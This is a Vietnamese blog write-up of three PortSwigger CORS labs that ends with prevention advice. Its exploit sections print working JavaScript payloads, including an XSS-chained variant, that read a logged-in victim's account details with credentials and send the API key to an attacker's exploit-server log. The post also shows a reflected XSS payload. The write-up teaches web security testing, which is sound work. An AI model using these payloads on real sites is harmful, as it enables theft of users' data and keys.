---
title: "[PortSwigger Lab] - Cross Origin Resource Sharing (CORS)"
description: Solution of Cross Origin Resource Sharing (CORS) on PortSwigger Lab
date: 2025-06-07 20:46:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, cors]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-07-portswigger-lab-cors/cors.png
    alt: Cross Origin Resource Sharing (CORS)
---

## Introduction
---
**Cross-Origin Resource Sharing (CORS)** là một cơ chế bảo mật của trình duyệt, cho phép hoặc từ chối các yêu cầu từ một origin khác với origin của trang web hiện tại. Nó mở rộng **Same-Origin Policy (SOP)** — chính sách chỉ cho phép các tài nguyên được truy cập nếu chúng đến từ cùng một origin (gồm `scheme`, `hostname` và `port`).

| **Tiêu chí**                       | **Same-Origin Policy (SOP)**                                                      | **Cross-Origin Resource Sharing (CORS)**                                                     |
| ---------------------------------- | --------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| **Mục tiêu chính**                 | Ngăn chặn website này truy cập dữ liệu riêng tư của website khác                  | Cho phép truy cập có kiểm soát đến tài nguyên từ origin khác                                 |
| **Phạm vi áp dụng**                | Trình duyệt web (JavaScript không được truy cập tài nguyên khác origin)           | Trình duyệt web (mở rộng khả năng truy cập cross-origin có kiểm soát)                        |
| **Thành phần xác định origin**     | Scheme (protocol), domain, port                                                   | Cũng dùng Origin (scheme + domain + port) để xác định ai được phép truy cập                  |
| **Hành vi mặc định**               | **Chặn** truy cập giữa các origin khác nhau                                       | **Không cho phép** nếu không có header CORS hợp lệ từ phía server                            |
| **Tác động đến JS**                | Không cho phép JavaScript đọc dữ liệu từ các trang khác origin                    | Cho phép nếu server gửi đúng header `Access-Control-Allow-Origin`                            |
| **Cho phép tải tài nguyên không?** | Có thể tải hình ảnh, script, font… từ domain khác (nhưng không được đọc nội dung) | Có thể cho phép đọc nội dung, gửi cookie nếu server đồng ý bằng header                       |
| **Kiểm soát từ phía nào?**         | Trình duyệt kiểm soát                                                             | Trình duyệt **và** server phối hợp (server phải trả header phù hợp)                          |
| **Có hỗ trợ cookie không?**        | Cookie được gửi theo origin, nhưng JS không thể đọc cookie của origin khác        | Có, nếu server trả `Access-Control-Allow-Credentials: true` và không dùng `*`                |
| **Tính mở rộng**                   | Không mở rộng – giới hạn nghiêm ngặt giữa các origin                              | Rất linh hoạt, nhưng dễ **cấu hình sai dẫn đến lỗ hổng bảo mật**                             |
| **Lỗi phổ biến**                   | Không có (vì chặn mặc định)                                                       | Phản hồi `Access-Control-Allow-Origin` với bất kỳ Origin (reflect origin) → **lỗ hổng CORS** |
| **Cách dùng phổ biến**             | Tự động, không cần cấu hình                                                       | Dùng khi website cần chia sẻ tài nguyên qua API hoặc frontend từ domain khác                 |

## Solve CORS Lab
---

| Thành phần                         | Giá trị phản ánh lỗi                              |
| ---------------------------------- | ------------------------------------------------- |
| `Access-Control-Allow-Origin`      | Phản chiếu lại bất kỳ `Origin` gửi lên            |
| `Access-Control-Allow-Credentials` | `true` (cho phép cookie được gửi đi và dùng)      |

### Lab: CORS vulnerability with basic origin reflection
#### Analysis
- Login bằng tài khoản được cấp 
- Mở **Proxy** > **HTTP History** của **Burp**
- Tìm request **AJAX** gửi đến `/accountDetails`, thấy response có header `Access-Control-Allow-Credentials: true` => Gợi ý rằng **server** có hỗ trợ **CORS**.
- Thêm header `Origin: https://evil.com` trong request để test server có **reflect Origin** không
- Server phản hồi `Access-Control-Allow-Origin: https://evil.com` => **reflect Origin**

=> Như này tất cả các request sẽ được trình duyệt chấp nhận 

#### Exploit
- Tạo script gửi đến victim
```html
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('GET', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
        req.withCredentials = true;  // Cho phép gửi cookie 
        req.send();

        function reqListener() {
            // Gửi kết quả (API key) về attacker (qua đường dẫn /log)
            location = '/log?key=' + this.responseText;
        };
    </script>
```
- Khi victim truy cập vào trang web của attacker, script trên được thực thi, theo hành vi mặc định, **browser** thêm **header Origin: evil.com** vào request, trong trường hợp này:
    - Server phản hồi lại `Access-Control-Allow-Origin: evil.com` và `Access-Control-Allow-Credentials: true`
    - Vì vậy request thành công khi server chấp nhận **Origin** và **cookie** từ **browser**
- Lấy **apikey** trong `/log` của **Exploit Server**, **smart decode** và submit

### CORS vulnerability with trusted null origin
#### Analysis
- Login bằng tài khoản được cấp 
- Mở **Proxy** > **HTTP History** của **Burp**
- Tìm request **AJAX** gửi đến `/accountDetails`, thấy response có header `Access-Control-Allow-Credentials: true` => Gợi ý rằng **server** có hỗ trợ **CORS**.
- Thêm header `Origin: https://evil.com` trong request để test server có **reflect Origin** không => Không
- Thêm header `Origin: https://YOUR-LAB-ID.web-security-academy.net` trong request để test server có **reflect Origin** không => Có
- Thêm header `Origin: null` trong request để test server có **reflect Origin** không => Có

=> Server chấp nhận cùng **origin** và **null** trong **while list**
#### Exploit
- Ý tưởng: Sử dụng kỹ thuật tấn công với `Origin: null` và **iframe sandbox**
- Tạo mã khai thác và gửi đến victim

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
    src="data:text/html,<script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','https://0ad5002f03f83ae3b5d42fbe00c30040.web-security-academy.net/accountDetails',true);
        req.withCredentials = true;
        req.send();

        function reqListener() {
            location='https://exploit-0a5000f803e43a46b5f22ed0016300f2.exploit-server.net/log?key='+this.responseText;
        };
    </script>">
</iframe>
```

| Quyền                  | Tác dụng                                                               | Nguy cơ                                                                                                   |
| ---------------------- | ---------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| `allow-scripts`        | Cho phép iframe chạy JavaScript.                                       | Nhưng **JS không được truy cập DOM cha**, và origin là `"null"` nếu sandbox không có `allow-same-origin`. |
| `allow-top-navigation` | Cho phép iframe điều hướng top-level (thay đổi `window.top.location`). | Có thể dùng để redirect người dùng.                                                                       |
| `allow-forms`          | Cho phép gửi form (POST, GET...).                                      | Có thể gửi request, nhưng không đọc được phản hồi nếu bị CORS chặn.                                       |

- Lấy **apikey** trong `/log` của **Exploit Server**, **smart decode** và submit

### CORS vulnerability with trusted insecure protocols
#### Analysis
- Login bằng tài khoản được cấp 
- Mở **Proxy** > **HTTP History** của **Burp**
- Tìm request **AJAX** gửi đến `/accountDetails`, thấy response có header `Access-Control-Allow-Credentials: true` => Gợi ý rằng **server** có hỗ trợ **CORS**.
- Thử thêm **header Origin** khác nhau để test hành vi của **server** => chỉ chấp nhận cùng **origin** và bất kết **scheme** nào
- Thử khai thác thêm: 
    - Vào 1 post bất kỳ
    - Checkstock => xuất hiện 1 subdomain
    - Thử khai thác XSS và thành công với payload: `https://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net/?productId=%3Cimg%20src=1%20onerror=alert()%3E&storeId=acb`
- Thử thay giá trị **header Origin** thành `https://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net` và thành công => origin được server tin cậy

#### Exploit
- Ý tưởng: Từ lỗi XSS ở subdomain, tạo script đế tấn công lấy **apikey**
- Mã trong phần body của **Exploit Server**
```html
<script>
    document.location="http://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a3b002d04976b6e81260c3a00900075.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() {location='https://exploit-0acf00f004266b3481b80b3b01a20006.exploit-server.net/log?key='%2bthis.responseText;};%3c/script>&storeId=1"
</script>
```
- Deliver to victim
- Lấy **apikey** trong `/log` của **Exploit Server**, **smart decode** và submit

## Prevent
---
### Proper configuration of cross-origin requests 
Nếu tài nguyên có thông tin nhạy cảm, chỉ nên cho phép origin tin cậy trong header:
**Access-Control-Allow-Origin:** `https://trusted-site.com`
### Only allow trusted sites 
Không nên phản chiếu **(reflect)** origin request một cách động không kiểm soát vì dễ bị lợi dụng.
### Avoid whitelisting null
**Access-Control-Allow-Origin:** `null` có thể cho phép các request **sandbox** hoặc từ tài liệu nội bộ. Nên tránh dùng.
### Avoid wildcards (*) in internal networks
Wildcard trong mạng nội bộ tạo lỗ hổng, vì dựa vào cấu hình mạng để bảo vệ không đủ, nếu trình duyệt nội bộ truy cập từ các domain không tin cậy bên ngoài.
### CORS is not a substitute for server-side security policies
- **CORS** chỉ là rào cản do trình duyệt áp dụng. **Server** vẫn phải kiểm soát chặt authentication, phân quyền, session,...
- Kẻ tấn công có thể gửi request giả mạo (forged request) trực tiếp tới server từ origin hợp lệ.

---
Goodluck! 🍀🍀🍀 